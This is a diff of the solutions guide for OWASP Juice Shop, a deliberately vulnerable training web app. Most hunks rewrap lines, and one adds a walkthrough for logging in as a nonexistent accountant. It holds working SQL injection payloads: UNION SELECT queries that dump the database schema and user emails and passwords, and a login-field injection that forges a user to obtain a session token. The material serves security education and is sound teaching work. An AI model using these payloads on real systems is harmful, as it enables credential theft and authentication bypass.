@@ -171,12 +171,12 @@ error situation and solve this challenge immediately:
 
 10. Next you get rid of the unwanted product results changing the query
     into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5',
-    '6', '7', '8', '9' FROM sqlite_master--` leaving only the "`UNION`ed"
-    element in the result set
+    '6', '7', '8', '9' FROM sqlite_master--` leaving only the
+    "`UNION`ed" element in the result set
 11. The last step is to replace one of the fixed values with correct
     column name `sql`, which is why searching for `qwert')) UNION SELECT
-    sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--` solves
-    the challenge.
+    sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--`
+    solves the challenge.
 
 ### Give a devastating zero-star feedback to the store
 
@@ -1250,8 +1250,8 @@ NPM page:
    3. `')) UNION SELECT '1', '2', '3' FROM Users--` fails with `number
       of result columns` error
    4. (...)
-   5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM Users--`
-      _still fails_ with `number of result columns` error
+   5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
+      Users--` _still fails_ with `number of result columns` error
    6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM
       Users--` finally gives you a JSON response back with an extra
       element
@@ -1259,15 +1259,15 @@ NPM page:
 
 7. Next you get rid of the unwanted product results changing the query
    into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5',
-   '6', '7', '8', '9' FROM Users--` leaving only the "`UNION`ed" element in
-   the result set
+   '6', '7', '8', '9' FROM Users--` leaving only the "`UNION`ed" element
+   in the result set
 8. The last step is to replace the fixed values with correct column
    names. You could guess those **or** derive them from the RESTful API
    results **or** remember them from previously seen SQL errors while
    attacking the _Login_ form.
 9. Searching for `qwert')) UNION SELECT '1', id, email, password, '5',
-   '6', '7', '8', '9' FROM Users--` solves the challenge giving you a the
-   list of all user data in convenient JSON format.
+   '6', '7', '8', '9' FROM Users--` solves the challenge giving you a
+   the list of all user data in convenient JSON format.
 
    ![User list from UNION SELECT attack](img/union_select-attack_result.png)
 
@@ -1558,7 +1558,26 @@ frustrated to finish what he originally planned to do.
 
 ### Log in with the (non-existing) accountant without ever registering that user
 
-:wrench: **TODO**
+1. Go to <http://localhost:3000/#/login> and try logging in with _Email_
+   `'` and any _Password_ while observing the Browser DevTools network
+   tab.
+2. You will notice the SQL query for the login in the error being
+   thrown: `"sql": "SELECT * FROM Users WHERE email = ''' AND password =
+   '339df5aeae5bc6ae557491e02619c5dd' AND deletedAt IS NULL"`
+3. Solve
+   [Exfiltrate the entire DB schema definition via SQL Injection](#exfiltrate-the-entire-db-schema-definition-via-sql-injection)
+   to learn the exact column names of the `Users` table.
+4. Prepare a `UNION SELECT` payload what will a) ensure there is no
+   result from the original query and b) will add the needed user
+   on-the-fly using static values in the query.
+5. Log in with _Email_ `' UNION SELECT * FROM (SELECT 15 as 'id', '' as
+   'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as
+   'password', 'accounting' as 'role', '1.2.3.4' as 'lastLoginIp' ,
+   'default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive',
+   '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16
+   14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--`
+6. This will trick the application backend into handing out a valid JWT token and
+   thus establishing a user session.
 
 ### Retrieve the language file that never made it into production
 
